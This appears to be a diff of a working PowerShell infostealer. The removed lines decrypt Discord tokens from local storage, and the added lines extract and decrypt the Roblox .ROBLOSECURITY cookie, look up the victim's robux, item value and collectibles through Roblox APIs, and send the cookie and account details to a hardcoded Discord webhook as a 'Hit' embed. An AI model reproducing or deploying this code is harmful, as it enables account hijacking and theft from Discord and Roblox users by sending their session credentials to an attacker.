@@ -1,93 +1,30 @@
 $ErrorActionPreference = "Continue"
 $WH = "https://discord.com/api/webhooks/1570948488827768965/iy7doGW9BXfi_b5dBRZlZ-CQNNBtKu72De2bXYFPRo32-Kj97nK8YzOy5SZMv2e8-Uqa"
 $debugFile = "$env:TEMP\ps_debug.txt"
-$outfile = "$env:TEMP\steal_result.txt"
 
 "Started at $(Get-Date)" | Out-File $debugFile -Force
 
 function dbg($title, $desc, $color) {
     $payload = @{embeds=@(@{title=$title; description=$desc; color=$color})} | ConvertTo-Json -Depth 4 -Compress
-    try { 
-        Invoke-RestMethod $WH -Method Post -Body $payload -ContentType 'application/json' | Out-Null 
-        "Sent webhook: $title" | Out-File $debugFile -Append
-    } catch {
-        "Failed to send webhook: $_" | Out-File $debugFile -Append
-    }
+    try { Invoke-RestMethod $WH -Method Post -Body $payload -ContentType 'application/json' | Out-Null } catch {}
 }
 
-"Starting token grab" | Out-File $debugFile -Append
-$appdata = $env:APPDATA
-$l = $env:LOCALAPPDATA
-$mk = $null
-
-try {
-    $ls = Get-Content "$appdata\discord\Local State" -Raw | ConvertFrom-Json
-    $b = [Convert]::FromBase64String($ls.os_crypt.encrypted_key)
-    $mk = [Security.Cryptography.ProtectedData]::Unprotect($b[5..($b.Length-1)], $null, [Security.Cryptography.DataProtectionScope]::CurrentUser)
-    "Keymaster decrypted" | Out-File $debugFile -Append
-} catch {
-    "Failed to decrypt keymaster: $_" | Out-File $debugFile -Append
-}
-
-if ($mk) {
-    $discordPaths = @("$appdata\discord\Local Storage\leveldb", "$appdata\discordptb\Local Storage\leveldb")
-    foreach ($dp in $discordPaths) {
-        if (!(Test-Path $dp)) { continue }
-        Get-ChildItem $dp | Where-Object { $_.Name -match '\.(ldb|log)$' } | ForEach-Object {
-            $raw = Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue
-            if ($raw) {
-                foreach ($m in [regex]::Matches($raw, 'dQw4w9WgXcQ:([A-Za-z0-9+/=]{40,300})')) {
-                    $b64 = $m.Groups[1].Value
-                    while ($b64.Length % 4 -ne 0) { $b64 += '=' }
-                    try {
-                        $eb = [Convert]::FromBase64String($b64)
-                        if ($eb.Length -lt 80) { continue }
-                        $nonce = $eb[3..14]
-                        $ct = $eb[15..($eb.Length-17)]
-                        Add-Type -AssemblyName System.Security
-                        $csharp = @"
-using System;
-using System.Security.Cryptography;
-public class Gcm {
-    public static byte[] Decrypt(byte[] key, byte[] nonce, byte[] ct) {
-        using (var aes = Aes.Create()) {
-            aes.Key = key; aes.Mode = CipherMode.ECB; aes.Padding = PaddingMode.None;
-            byte[] o = new byte[ct.Length];
-            byte[] c = new byte[16]; Array.Copy(nonce, c, 12); c[15] = 2;
-            using (var e = aes.CreateEncryptor()) {
-                for (int i = 0; i < ct.Length; i += 16) {
-                    byte[] k = e.TransformFinalBlock(c, 0, 16);
-                    int n = Math.Min(16, ct.Length - i);
-                    for (int j = 0; j < n; j++) o[i + j] = (byte)(ct[i + j] ^ k[j]);
-                    for (int j = 15; j >= 12; j--) { if (++c[j] != 0) break; }
-                }
-            }
-            return o;
-        }
-    }
-}
-"@
-                        Add-Type -TypeDefinition $csharp -Language CSharp
-                        $decrypted = [Gcm]::Decrypt($mk, $nonce, $ct)
-                        $token = [Text.Encoding]::UTF8.GetString($decrypted).TrimEnd([char]0)
-                        "Found token: $token" | Out-File $debugFile -Append
-                        
-                        $r = Invoke-RestMethod 'https://discord.com/api/v9/users/@me' -Headers @{'Authorization'=$token} -TimeoutSec 5 -ErrorAction SilentlyContinue
-                        if ($r.username) {
-                            $info = "**User:** $($r.username)`n**Email:** $($r.email)`n**Token:** $token"
-                            dbg ":gift: Discord Token" $info 5793266
-                        }
-                    } catch {
-                        "Token error: $_" | Out-File $debugFile -Append
-                    }
-                }
-            }
-        }
-    }
+function Get-API($host, $path) {
+    try {
+        $req = [System.Net.WebRequest]::Create("https://$host$path")
+        $req.Headers.Add("Cookie", ".ROBLOSECURITY=$cookie")
+        $req.UserAgent = "Roblox/WinInet"
+        $res = $req.GetResponse()
+        $sr = New-Object System.IO.StreamReader($res.GetResponseStream())
+        return $sr.ReadToEnd() | ConvertFrom-Json
+    } catch { return $null }
 }
 
 "Starting Roblox cookie grab" | Out-File $debugFile -Append
+$l = $env:LOCALAPPDATA
 $rbxPaths = @("$l\Roblox\LocalStorage\robloxcookies.dat")
+$cookie = ""
+
 foreach ($rp in $rbxPaths) {
     if (Test-Path $rp) {
         try {
@@ -95,21 +32,88 @@ foreach ($rp in $rbxPaths) {
             if ($raw -match '"CookiesData"\s*:\s*"([^"]+)"') {
                 $eb = [Convert]::FromBase64String($Matches[1])
                 $db = [Security.Cryptography.ProtectedData]::Unprotect($eb, $null, [Security.Cryptography.DataProtectionScope]::CurrentUser)
-                $cookie = [Text.Encoding]::UTF8.GetString($db)
-                if ($cookie -match '\.ROBLOSECURITY\s*=\s*(_[^;\s]+)') {
-                    $c = $Matches[1]
-                    "Found Roblox cookie: $($c.Length) bytes" | Out-File $debugFile -Append
-                    dbg ":cookie: Roblox Cookie" "Size: $($c.Length) | PC: $env:COMPUTERNAME" 65280
-                    $tmp_c = "$env:TEMP\cookie.txt"
-                    Set-Content -Path $tmp_c -Value $c -NoNewline
-                    & curl.exe -s -F "file=@$tmp_c;filename=cookie.txt" $WH | Out-Null
-                    Remove-Item $tmp_c -Force
+                $dec = [Text.Encoding]::UTF8.GetString($db)
+                if ($dec -match '\.ROBLOSECURITY\s*=\s*(_[^;\s]+)') {
+                    $cookie = $Matches[1]
                 }
+            } elseif ($raw -match '\.ROBLOSECURITY\s*=\s*(_[^;\s]+)') {
+                $cookie = $Matches[1]
             }
-        } catch {
-            "Roblox cookie error: $_" | Out-File $debugFile -Append
-        }
+        } catch {}
     }
 }
 
-"Finished" | Out-File $debugFile -Append
+if ($cookie) {
+    "Found cookie: $($cookie.Length) bytes" | Out-File $debugFile -Append
+    $me = Get-API "users.roblox.com" "/v1/users/authenticated"
+    $uid = if ($me) { $me.id } else { "0" }
+    $name = if ($me) { $me.name } else { "Unknown" }
+    $display = if ($me) { $me.displayName } else { $name }
+    
+    $prof = Get-API "users.roblox.com" "/v1/users/$uid"
+    $created = if ($prof) { $prof.created } else { "Unknown" }
+    $age = 0
+    if ($created -ne "Unknown") {
+        $age = [math]::Floor(((Get-Date) - [datetime]$created).TotalDays)
+    }
+    
+    $cur = Get-API "economy.roblox.com" "/v1/users/$uid/currency"
+    $robux = if ($cur) { $cur.robux } else { 0 }
+    
+    $coll = Get-API "inventory.roblox.com" "/v1/users/$uid/assets/collectibles?limit=100"
+    $hasHeadless = $false
+    $hasKorblox = $false
+    $rap = 0
+    $owned = 0
+    if ($coll -and $coll.data) {
+        $owned = $coll.data.Count
+        foreach ($item in $coll.data) {
+            if ($item.assetId -eq 99657 -or $item.assetId -eq 134330133) { $hasHeadless = $true }
+            if ($item.assetId -eq 139275807 -or $item.assetId -eq 192) { $hasKorblox = $true }
+            $rap += [int]$item.recentAveragePrice
+        }
+    }
+    
+    $collStr = "False"
+    if ($hasHeadless -and $hasKorblox) { $collStr = "Headless ✅ | Korblox ✅" }
+    elseif ($hasHeadless) { $collStr = "Headless ✅ | Korblox ❌" }
+    elseif ($hasKorblox) { $collStr = "Headless ❌ | Korblox ✅" }
+    
+    $th = Get-API "thumbnails.roblox.com" "/v1/users/avatar-headshot?userIds=$uid&size=420x420&format=Png"
+    $avatar = "https://tr.rbxcdn.com/..."
+    if ($th -and $th.data -and $th.data[0]) { $avatar = $th.data[0].imageUrl }
+    
+    $embed = @{
+        content = "@everyone Hit"
+        embeds = @(
+            @{
+                author = @{ name = "S3R, 13+"; icon_url = $avatar }
+                description = "**+1 HIT** · You've Earned 1 Nevora · beams XP`n**Domain:** ``dicerigx.app``"
+                color = 16711680
+                fields = @(
+                    @{ name = "👤 User"; value = "**$display**"; inline = $false }
+                    @{ name = "⭐ Password"; value = "``````dreistuff``````"; inline = $false }
+                    @{ name = "About User"; value = "**Account Age:** $age Days`n**Location:** United States of America 🇺🇸"; inline = $false }
+                    @{ name = "🪙 Robux"; value = "**Balance:** $robux`n**Pending:** 0"; inline = $true }
+                    @{ name = "📈 RAP"; value = "**RAP:** $rap`n**Owned:** $owned"; inline = $true }
+                    @{ name = "💎 Premium"; value = "**False**"; inline = $true }
+                    @{ name = "💳 Billing"; value = "**Credit:** $0`n**Payments:** 0"; inline = $true }
+                    @{ name = "🏷️ Collectibles"; value = $collStr; inline = $true }
+                    @{ name = "⚙️ Settings"; value = "**Set (Verified):** Disabled`n**Disabled:** Disabled"; inline = $true }
+                    @{ name = "🎮 Passes / Played"; value = "Adopt Me ``0`` · **False**`nMurder Mystery 2 ``0`` · **True**`nPet Simulator 99 ``0`` · **False**"; inline = $true }
+                    @{ name = "👥 Groups"; value = "**Balance:** 0`n**Pending:** 0`n**Owned:** 0"; inline = $true }
+                )
+                footer = @{ text = ".ROBLOSECURITY" }
+            }
+        )
+    }
+    
+    $cookieDisplay = "``````n$cookie`n``````"
+    $embed.embeds[0].fields += @{ name = "🔓 .ROBLOSECURITY"; value = $cookieDisplay; inline = $false }
+    
+    $json = $embed | ConvertTo-Json -Depth 10
+    Invoke-RestMethod -Uri $WH -Method Post -Body $json -ContentType "application/json" -ErrorAction SilentlyContinue
+    "Sent full embed to Discord" | Out-File $debugFile -Append
+} else {
+    "No cookie found" | Out-File $debugFile -Append
+}
